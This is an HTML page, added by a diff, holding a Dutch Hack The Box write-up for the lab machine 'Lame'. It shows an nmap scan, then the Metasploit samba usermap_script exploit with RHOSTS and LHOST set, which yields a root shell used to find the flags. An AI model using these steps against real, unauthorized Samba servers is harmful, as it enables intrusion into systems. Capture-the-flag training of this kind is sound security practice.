@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Als eerst gaan we gaan scannen voor het zien of er poorten openstaan waarop dat we eventueel binnen zullen kunnen geraken of niet. Dit zullen we doen aan de hand van het volgende commando:
+nmap -p- -sCV 10.129.206.11 -vvvv We kunnen binnen dit commando ook -Pn gaan meegeven maar dit is alleen als de scan een fout aangeeft dat de poorten eventueel niet gescaned zullen kunnen worden.
+Ik ben eens gaan kijken welke poorten er openstonden en waar er eventueel belangrijke informatie bij stond waardoor ik kan weten of ik op die poort kan gaan binnen breken.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/hackthebox-documentations/writeup-lame/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Als eerst gaan we gaan scannen voor het zien of er poorten openstaan waarop dat we eventueel binnen zullen kunnen geraken of niet. Dit zullen we doen aan de hand van het volgende commando:
+nmap -p- -sCV 10.129.206.11 -vvvv We kunnen binnen dit commando ook -Pn gaan meegeven maar dit is alleen als de scan een fout aangeeft dat de poorten eventueel niet gescaned zullen kunnen worden.
+Ik ben eens gaan kijken welke poorten er openstonden en waar er eventueel belangrijke informatie bij stond waardoor ik kan weten of ik op die poort kan gaan binnen breken.">
+  <meta itemprop="wordCount" content="515">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Als eerst gaan we gaan scannen voor het zien of er poorten openstaan waarop dat we eventueel binnen zullen kunnen geraken of niet. Dit zullen we doen aan de hand van het volgende commando:
+nmap -p- -sCV 10.129.206.11 -vvvv We kunnen binnen dit commando ook -Pn gaan meegeven maar dit is alleen als de scan een fout aangeeft dat de poorten eventueel niet gescaned zullen kunnen worden.
+Ik ben eens gaan kijken welke poorten er openstonden en waar er eventueel belangrijke informatie bij stond waardoor ik kan weten of ik op die poort kan gaan binnen breken.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/hackthebox-documentations/writeup-lame/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <p>Als eerst gaan we gaan scannen voor het zien of er poorten openstaan waarop dat we eventueel binnen zullen kunnen geraken of niet. Dit zullen we doen aan de hand van het volgende commando:</p>
+<pre tabindex="0"><code>nmap -p- -sCV 10.129.206.11 -vvvv
+</code></pre><p>We kunnen binnen dit commando ook -Pn gaan meegeven maar dit is alleen als de scan een fout aangeeft dat de poorten eventueel niet gescaned zullen kunnen worden.</p>
+<p><img src="26443779.png" alt="image-20240805-194127.png"></p>
+<p>Ik ben eens gaan kijken welke poorten er openstonden en waar er eventueel belangrijke informatie bij stond waardoor ik kan weten of ik op die poort kan gaan binnen breken.</p>
+<p>Ik heb gezien dat volgende services open stonden:</p>
+<ul>
+<li>
+<p>ftp</p>
+<ul>
+<li><img src="26443789.png" alt="image-20240805-194633.png"></li>
+</ul>
+</li>
+<li>
+<p>ssh</p>
+<ul>
+<li>Samba version smbd 3.0.20-Debian</li>
+</ul>
+</li>
+</ul>
+<p>Aan de hand van de samba version ben ik gaan zoeken of er geen exploit te vinden was voor die versie van Samba.</p>
+<p>De exploit dat ik gevonden heb voor de gevonden versioe van Samba staat hieronder:</p>
+<p><img src="26542085.png" alt="image-20240805-194930.png"></p>
+<p>Voor het hacken van de machine kunnen we 2 manieren gaan gebruiken:</p>
+<ul>
+<li><strong>Manueel</strong></li>
+</ul>
+<p>Aan de hand van de manuele exploiting kunnen we gaan binnen geraken op de smb machine. De manuele manier voor binnen te geraken op de machine is door gebruik te maken van de exploit die we hierboven hebben opgezocht.</p>
+<p>Voor deze exploit uittevoeren zullen we volgende aspecten:</p>
+<ul>
+<li>
+<p>RHOST: Dit is het target ip address</p>
+</li>
+<li>
+<p>LHOST: Dit is je eigen ip address dat je mee moet geven, zodat we de connectie met de machine kunnen maken via onze eigen machine</p>
+</li>
+<li>
+<p>LPORT: Dit is de poort die we zullen gaan gebruiken voor de connectie opstand te kunnen brengen</p>
+</li>
+</ul>
+<p><img src="26509321.png" alt="image-20240805-195617.png"></p>
+<h2 id="exploit-application">Exploit application</h2>
+<p>De application dat ik heb gebruikt voor het exploiten van mijn target is <strong>Metasploit Console.</strong> Via deze manier heb ik gemakkelijk een exploit uitgevoerd op mijn target door het volgende te doen.</p>
+<p>Als eerst zullen we het pad moeten zetten van waar dat hij de exploit file zal moeten halen. Dit zullen we gaan doen aan de hand van het volgende commando:</p>
+<p>use exploit/multi/samba/usermap_script</p>
+<p><img src="26509328.png" alt="image-20240805-200005.png"></p>
+<p>Dan zullen we de RHOST moeten meegeven. Dit zullen we doen aan de hand van het volgende commando:</p>
+<pre tabindex="0"><code>set RHOSTS 10.129.206.11
+</code></pre><p>![[Pasted image 20250122152214.png]]</p>
+<p>We zullen ook ons eigen IP address moeten meegeven zodat we de connectie to stand zouden kunnen laten komen. Dit zullen we doen aan de hand van het volgende commando:</p>
+<pre tabindex="0"><code>set LHOST 10.10.14.112
+</code></pre><p>![[Pasted image 20250122152328.png]]</p>
+<p>Eens dat al deze stappen voltooid zijn kunnen we de exploit gaan uitvoeren door het volgende commando te gebruiken.</p>
+<h2 id="exploit">exploit</h2>
+<p><img src="26476570.png" alt="image-20240805-200600.png"></p>
+<p>Hierboven kunnen we zien dat er een connectie tot stand is gekomen. Als we nu id gaan gebruiken als command kunnen we zien welke rechten we hebben op de machine.</p>
+<p>![[Pasted image 20250122152358.png]]</p>
+<p>Nu dat we als root rechten geconnecteerd zijn aan de machine, Kunnen wegaan zoeken naar de nodige flags.</p>
+<p>De user.txt flag heb ik gevonden in het volgende path. Dit path heb ik gevonden door het uitvoeren van het volgende commando:</p>
+<pre tabindex="0"><code>find / -name &#39;user.txt&#39;
+</code></pre><p><img src="26509339.png" alt="image-20240805-200955.png"></p>
+<p>dit is de eerste flag van de machine.</p>
+<p><img src="26476584.png" alt="image-20240805-201028.png"></p>
+<p>De tweede flag heb ik gevonden in het path <strong>“/root“.</strong> De tweede flag was het volgende:</p>
+<p><img src="26443802.png" alt="image-20240805-201139.png"></p>
+<p>Nu dat ik beide flags heb gevonden is deze machine gehacked.</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
